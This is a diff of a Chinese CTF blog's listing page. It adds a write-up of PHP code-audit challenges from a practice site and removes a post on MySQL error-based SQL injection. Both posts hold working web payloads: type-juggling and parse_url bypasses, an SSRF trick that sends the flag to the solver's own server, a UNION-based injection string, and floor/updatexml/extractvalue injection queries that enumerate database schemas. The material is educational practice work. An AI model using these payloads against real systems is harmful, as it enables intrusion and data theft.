@@ -41,7 +41,7 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>30</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>31</strong><br>文章</div></a>
       <a href="/categories"><div><strong>3</strong><br>分类</div></a>
       <a href="/tags"><div><strong>14</strong><br>标签</div></a>
     </div>
@@ -68,6 +68,79 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-关于代码审计的一些绕过方式" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/08/02/关于代码审计的一些绕过方式/" class="article-date">
+  <time class="post-time" datetime="2018-08-02T10:29:37.000Z" itemprop="datePublished">
+    <span class="post-month">8月</span><br>
+    <span class="post-day">02</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/02/关于代码审计的一些绕过方式/">关于代码审计的一些绕过方式</a>
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这段时间断断续续的在做一些题目，知识点太过杂乱，而且时间太过仓促所以没写多少博客，最近刚好在系统学习一些php代码审计的内容，因此记录一些常见的绕过方式(参考一夜飘零师傅的博客)<br>题目的地址如下:<a href="http://solveme.peng.kr/" target="_blank" rel="noopener">http://solveme.peng.kr/</a>    </p>
+<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p><img src="/images/17/1.png" alt=""><br>按照他如何加密我们如何解密就行了。  </p>
+<h2 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h2><p><img src="/images/17/2.png" alt=""><br>题目要求我们传入一个名为answer的变量，变量要等于后面一串奇怪的字符串。<br>直接复制是不太可能的，这里的字符应该是不可见字符，所以我们可以直接用脚本抓取网页代码然后在对应的区域进行url编码，最后把url编码传过去。附上脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">url = &apos;http://badcompare.solveme.peng.kr/&apos;</span><br><span class="line">r = requests.get(url)</span><br><span class="line">ans = urllib.quote(r.content[917:927])</span><br><span class="line">print ans</span><br></pre></td></tr></table></figure></p>
+<h2 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h2><p><img src="/images/17/3.png" alt=""><br>这里要求我们传入的time值为数字类型，并且要介于（60 <em> 60 </em> 24 <em> 30 </em> 2）和（60 <em> 60 </em> 24 <em> 30 </em> 3）之间，满足条件后，网页会把time转化为int型然后沉睡time秒后回显flag，这里肯定是不可能等两到三个月的时间来拿flag的。关键点在于is_numeric()函数，这个函数可以检测数字和数字字符串，不仅可以检测十进制，也能检测十六进制，并且科学记数法也能检测出。但是有一个细节可以注意，网页是把time转化为了int型变量，既然有了is_nemeric()函数，为什么还需要用int类型转换呢？<br>这里就要利用int类型转化的缺陷了，int在转换字符型时，碰到字母就会停下来，也就是说<strong>(int)0e213</strong>等于0，这个在MD5弱类型比较时有着很强的作用。结合两者，我们可以想到用科学记数法来绕过。time赋值为6e6，等待六秒就行了。  </p>
+<h2 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h2><p><img src="/images/17/4.png" alt=""><br>这题目是一个陷阱，它直接给出了登入成功会跳转的地址，所以我们是没必要去登入的，成功绕过登入实在是太过困难了一点，不过值得注意的是，直接访问index.php会跳转回来，我们可以抓包拿flag。<br><img src="/images/17/5.png" alt="">  </p>
+<h2 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h2><p><img src="/images/17/6.png" alt=""><br>读题，题目的大致意思是把url?后的字符串以&amp;作为分隔符分开，然后以=作为分隔符，前者为key，后者为value，然后要求变量do_you_want_flag=yes，但是key和value的值不能为do_you_want_flag和yes。<br>这里就存在一个矛盾了，既然url不能出现do_you_want_flag和yes那么我们如何通过get的方式得到do_you_want_flag变量值为yes呢？这里题目关键在于这里:<br><img src="/images/17/7.png" alt=""><br><img src="/images/17/8.png" alt=""><br>对于不合格的url会返回false，所以我们可以构造这个函数认为不合格但是服务器可以解析的url，例如这个:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr//?do_you_want_flag=yes</span><br></pre></td></tr></table></figure></p>
+<p>这里就可以成功绕过得到flag了。  </p>
+<h2 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h2><p><img src="/images/17/9.png" alt=""><br>这题目比较简单，sha加密弱类型比较用数组就可以轻松绕过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2</span><br></pre></td></tr></table></figure></p>
+<h2 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h2><p><img src="/images/17/10.png" alt=""><br>审题，题目要求我们不能输入username变量的值，只能通过chr(value)一个一个拼接成username变量的值，但是value不能在32-127之间，而我们的字符ascii码却在这之中，这题绕过方式很简单，关键在于chr()这个函数，chr()函数如果在处理大于256的值时，它会mod256直到参数小于256为止再进行操作，password读取/secret.passwd就能得到，所以payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://array2string.solveme.peng.kr/index.php?value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</span><br></pre></td></tr></table></figure></p>
+<h2 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h2><p><img src="/images/17/11.png" alt=""><br>题目的意思是让我们输入一个url参数的值，但是呢，有几点要求：<br>第一是不能有类似_或者|和空格之类的字符。<br>第二必须要有http或者https开头，并且域名为题目的域名，也就是<a href="http://givemealink.solveme.peng.kr/。" target="_blank" rel="noopener">http://givemealink.solveme.peng.kr/。</a><br>第三是需要有/plz_give_me这个路径。<br>现在难点有两个，第一个是在_被禁止使用的时候如何绕过检测url路径中的/plz_give_me，这个问题查阅parse_url这个函数就可以解决，在解析url时，如果碰到无效字符，例如%10，%11等，就会使用_来替代这个无效字符。<br>第二个问题就是如何拿到flag了，这个问题的解决方法就是用到@的黑魔法了，如果按照正常的构造：<a href="http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr/plz%10give%10me" target="_blank" rel="noopener">http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr/plz%10give%10me</a><br>那服务器就会去访问givemealink.solveme.peng.kr/flag这个地址，我们没办法看到flag(除非我们是这个服务器的拥有者)，所以我们得让我们自己的服务器接收到这个才行。  </p>
+<p><img src="/images/17/12.png" alt=""><br><img src="/images/17/13.png" alt=""><br>如果我们使用了@，那么parse_url解析url时的host就是@后面的域名了，所以加上一个@再加自己服务器的ip就可以接收到flag了。  </p>
+<h2 id="Give-me-a-link2"><a href="#Give-me-a-link2" class="headerlink" title="Give me a link2"></a>Give me a link2</h2><p><img src="/images/17/14.png" alt=""><br>题目和上一个差不多的要求，就是多了一点：host只能是localhost，127.xx.xx.xx，或者一个任意字符串加端口，也就是说这里不能使用xx.xx.xx.xx或者是xxxx.xxx的地址，满足条件后建立连接带flag访问其服务器的端口，如果访问成功则会返回Okay字样，但是如何绕过限制来使得这题目向我们服务器发生请求呢?<br><img src="/images/17/15.png" alt=""><br>这里可以使用ip2long函数，这个函数会把ip转化为字符串形式，这里就可以绕过检测并且使得网页访问我们的服务器，构造?url=<a href="http://xxxxxx:xxxx/plz%10give%10me，网页直接回显了flag，要是没回显监听端口也能得到flag。" target="_blank" rel="noopener">http://xxxxxx:xxxx/plz%10give%10me，网页直接回显了flag，要是没回显监听端口也能得到flag。</a></p>
+<h2 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h2><p><img src="/images/17/16.png" alt=""><br>题目要求我们传入say变量的值，要求长度要小于20，并且只有say变量中有give_me_the_flag字符串才能得到flag，但是呢，在得到flag之前有一个替换的过程，只要匹配到带有flag的字符串就会被替换为后面一串奇怪的字符，这样一被替换那根本不可能得到flag，所以我们需要尝试绕过。<br>正则匹配时，.是不会匹配换行符的，在解析完换行符后不在同一行的话是匹配不到的。所以使用%0a即可绕过。<br>PS:这题目想到了onethink那道题目，那道题目就是通过%0a换行之后绕过了//，把shell写入了文件。  </p>
+<h2 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h2><p>这题目一打开就和其他画风不太对，f12发现这是js混淆，先解密再说，脚本是从一叶飘零大佬那里借鉴来的。<br><img src="/images/17/17.png" alt=""><br>解密发现了一堆可疑的数字，用脚本处理下直接出答案了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">text = &apos;...&apos;  #那串字符串</span><br><span class="line">text = text.replace(&apos;&quot;&apos;,&apos;&apos;)</span><br><span class="line">text = text.split(&apos;,&apos;)</span><br><span class="line">final = &quot;&quot;</span><br><span class="line">for i in range(0,len(text)):</span><br><span class="line">    temp = &quot;&quot;</span><br><span class="line">    temp = text[i]</span><br><span class="line">    temp = temp.replace(&apos;+&apos;,&apos;&apos;)</span><br><span class="line">    temp = chr(int(temp))</span><br><span class="line">    final = final + temp</span><br><span class="line">print final</span><br></pre></td></tr></table></figure></p>
+<h2 id="Lax-CAPTCHA"><a href="#Lax-CAPTCHA" class="headerlink" title="Lax CAPTCHA"></a>Lax CAPTCHA</h2><p><img src="/images/17/18.png" alt=""><br>这题目我没做出来，分享一下思路吧。<br>题目要求我们先用generate触发生成图片码的应用，再让我们在3秒内输入验证码得到flag，人工拼手速是不行的，十五个字母太过长了。所以我想回溯到生成图片的最开始去获取answer，但是我发现一旦解码就成了乱码，无法进一步回溯，gg。<br>第二种思路就是用脚本识别验证码然后传参，但是这种方法目前实现太过困难了，通过像素点从数据库中一一比对这种技术我还做不到，所以gg。<br>第三种就是去预测生成的验证码了，mt_rand也是一个伪随机生成器，但是我预测失败，gg。  </p>
+<h2 id="Anti-SQLi"><a href="#Anti-SQLi" class="headerlink" title="Anti SQLi"></a>Anti SQLi</h2><p><img src="/images/17/19.png" alt=""><br>这题目就是一道注入题，给了源码而已，有点像实验吧的一些注入题。题目一开始过滤了一堆东西，与其去看正则还不如用字典扫一下，再结合来看。<br>首先是闭合符’被过滤了，这里可以考虑看看编码情况，如果是gbk编码可以构造出’，但是这里不存在这种方法。但是接着后看的时候发现了一点，发现转义符\并没有过滤完善，过滤\是需要四个\来完成的，所以这里可以用\闭合掉一个’造成闭合符逃逸，接着就是如何注释的问题了，上面仔细观察发现过滤了–加上后面是空格符，换行符之类的，但是忽略了一个不可见字符，所以这里可以使用–%10来注释掉，最后一个问题就是需要查询出31337这个数据，要知道如果使用<strong>SELECT * FROM <code>antisqli</code> WHERE <code>id</code>=’{$id}’ AND <code>pw</code>=md5(‘{$pw}’)</strong>这个查询语句是查不出的，这里就必须要用到联合查询语句，但是order by和union select 被过滤了，order by倒是可以使用一个一个猜测来完成，但是union select要怎么办呢？可以在中间加个all，只是这个整体被过滤我们只要改变这个就行了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,1,1 from antisqli --%10</span><br></pre></td></tr></table></figure></p>
+<p>回显hello,1<br>所以把1都改为31337就行了</p>
+<h2 id="Name-check"><a href="#Name-check" class="headerlink" title="Name check"></a>Name check</h2><p><img src="/images/17/20.png" alt=""><br>先看得到flag的条件，需要row[0]，row[1]，row[2]，row[3]四个相加等于4，也就是说他们四个要为true才行。那接着分析四个语句。<br>第一个条件要求字符串开头要为a。<br>第二个条件要求d字符不能在开头。<br>第三个条件要求字符要为a_m__的格式。<br>第四个条件字符后两位为in。<br>结合起来看就是要求name为admin，但是题目会过滤admin以及一些连接符，这里值得注意的是sqlite不像mysql一样使用+来进行连接，而是使用||，所以使用ad’||’min即可绕过。  </p>
+<h2 id="Super-secure-hash"><a href="#Super-secure-hash" class="headerlink" title="Super secure hash"></a>Super secure hash</h2><p><img src="/images/17/21.png" alt=""><br>这题目没做出来，最后只得到crc32加密后的密码:<br><img src="/images/17/22.png" alt=""><br>这题目思路很明确了，就是通过爆破去找到这个加密前的密码。在比较密码的时候清一色都是使用强类型比较根本不可能使用布尔值来绕过，所以只能去找密码，但是crc32在6位以上的密码又是基本不可能爆破出的，所以卡死在这了，gg。  </p>
+<h3 id="最后几道题目知识点有点多，还是单独写比较好，毕竟太快写完有点知识不牢固。还是太懒了啊…-学习动力匮乏，希望找点一点积极的东西来促进学习吧。"><a href="#最后几道题目知识点有点多，还是单独写比较好，毕竟太快写完有点知识不牢固。还是太懒了啊…-学习动力匮乏，希望找点一点积极的东西来促进学习吧。" class="headerlink" title="最后几道题目知识点有点多，还是单独写比较好，毕竟太快写完有点知识不牢固。还是太懒了啊…..学习动力匮乏，希望找点一点积极的东西来促进学习吧。"></a>最后几道题目知识点有点多，还是单独写比较好，毕竟太快写完有点知识不牢固。还是太懒了啊…..学习动力匮乏，希望找点一点积极的东西来促进学习吧。</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/08/02/关于代码审计的一些绕过方式/" data-id="cjul6evpz002aw8vjqwvf2uf9" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-近期比赛学习到的一些知识" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
@@ -114,7 +187,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjsyilygc001unsvjc9yvrwca" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjul6evpt001xw8vj9du48q27" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>
@@ -181,7 +254,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjsyilygs002dnsvj3qy0upka" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjul6evpj001gw8vjp2s490a1" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -248,7 +321,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjsyilyfw0015nsvjv325d8n1" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjul6evp70012w8vjqvz9f4rh" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
@@ -318,7 +391,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjsyilyfw0019nsvjoevw7mxu" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjul6evpl001jw8vjrk7cihqp" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
@@ -379,7 +452,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjsyilygc001xnsvjuk369ahm" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjul6evpr001uw8vj0jisdewj" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-XSS/">Web XSS</a></li></ul>
@@ -464,7 +537,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjsyilydq000dnsvjh54u5tv7" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjul6evph001ew8vj7u849pqt" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -523,7 +596,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjsyilyfh0012nsvjiqw794i7" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjul6evp80013w8vj9gfew6of" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -680,7 +753,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjsyilyfw001knsvjs1wymd7f" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjul6evpe0019w8vj2v4td44j" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -743,7 +816,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjsyilyfh000nnsvjg30mi6o6" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjul6evmf000gw8vjkig8yy7o" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -757,75 +830,10 @@ while flag:
 
 
   
-    <article id="post-sql注入之报错注入" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/05/01/sql注入之报错注入/" class="article-date">
-  <time class="post-time" datetime="2018-05-01T14:50:37.000Z" itemprop="datePublished">
-    <span class="post-month">5月</span><br>
-    <span class="post-day">01</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/05/01/sql注入之报错注入/">sql注入之报错注入</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入是在有返回错误信息的情况下尝试使用的一种注入方式，一般是在使用延时注入之前考虑的，之所以最后归纳是因为它的注入语句实在是太过冗长，而且并没有什么逻辑规律可言，理解起来十分困难。<br>报错注入可以主要可以分为以下几种方式:<br>floor函数报错<br>UpdateXml函数报错<br>extractvalue函数报错<br>后两种方式具有一定的局限性，报错查询的内容长度最长为32位。  </p>
-<h3 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor()报错"></a>floor()报错</h3><p>在如何使用floor()报错注入的时候，应该先理解报错注入语句的意义。主要用到以下几个函数：<br>floor():向下取整<br>rand():生成随机数<br>count():统计结果<br>简单来说就是在查询的时候让其rand()产生不确定的数在使用order by排序时产生报错来返回信息。<br><strong><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="noopener">具体参考这篇文章</a></strong><br>我就直接给出语句：  </p>
-<blockquote>
-<p><strong>1 数据库</strong> and (select 1 from(select count(<em>),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>2 库名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>3 表名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=数据库名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)  –+<br><strong>4 列名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=表名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>5 字段</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x23,列名,0x3a,列名,0x23) FROM 表名 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+  </p>
-</blockquote>
-<p>至于其他的语句自己慢慢测试，语句不限这一种，报错注入的成因并不是语句顺序的问题而是在于其逻辑。  </p>
-<h3 id="Updataxml报错"><a href="#Updataxml报错" class="headerlink" title="Updataxml报错"></a>Updataxml报错</h3><p>并没有深入学习Mysql语句，所以对Updataxml()这个函数也是不太了解的，直接贴出具体的报错注入语句吧。。。  </p>
-<blockquote>
-<p><strong>1 数据库</strong> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) –+<br><strong>2 库名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1),0x7e),1) –+<br><strong>3 表名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema=库名 limit 0,1),0x7e),1) –+<br><strong>4 列名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name=表名 limit 0,1),0x7e),1) –+<br><strong>5 字段</strong> and updataxml(1,concat(0x7e,(select group_concat(列名) from 表名),0x7e),1) –+  </p>
-</blockquote>
-<h3 id="Extractvalue报错"><a href="#Extractvalue报错" class="headerlink" title="Extractvalue报错"></a>Extractvalue报错</h3><p>这个函数的原理和上个函数差不多，具体格式如下  </p>
-<blockquote>
-<p>and extractvalue(1, concat(0x7e, (select database()),0x7e))  –+  </p>
-</blockquote>
-<p>其他的和上面类似，一一对照就行了。  </p>
-<h2 id="sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。"><a href="#sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。" class="headerlink" title="sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。"></a>sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。</h2>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjsyilyfh000xnsvjfrhk1anx" class="article-share-link">分享</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
 
 
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; pre</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; pre</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">next &raquo;</a>
   </nav>
 </section>
         
@@ -866,7 +874,7 @@ while flag:
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>30</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>31</strong><br>文章</div></a>
       <a href="/categories"><div><strong>3</strong><br>分类</div></a>
       <a href="/tags"><div><strong>14</strong><br>标签</div></a>
     </div>
